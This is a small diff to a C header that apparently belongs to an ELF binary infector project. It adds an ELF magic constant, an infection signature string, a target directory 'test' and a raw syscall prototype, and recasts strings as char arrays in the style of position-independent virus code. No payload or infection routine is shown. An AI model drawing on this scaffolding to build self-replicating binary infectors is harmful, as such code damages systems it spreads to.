@@ -32,9 +32,12 @@
 # define SELF64_RELA sizeof(Elf64_Rela)
 # define SELF64_DYN  sizeof(Elf64_Dyn)
 
+#define _ELFMAG (char[]){0x7f, 'E', 'L', 'F'}
 #define FSIGN_TSIZE 7
-#define FSIGN_STR "<sign>\n"
-#define DIR_CIBLE "test"
+#define FSIGN_STR (char[]){'<','s','i','g','n','>','\n'}
+#define DIR_CIBLE (char[]){'t','e','s','t', 0x0}
+
+long _syscall(long number, ...);
 
 typedef struct
 {
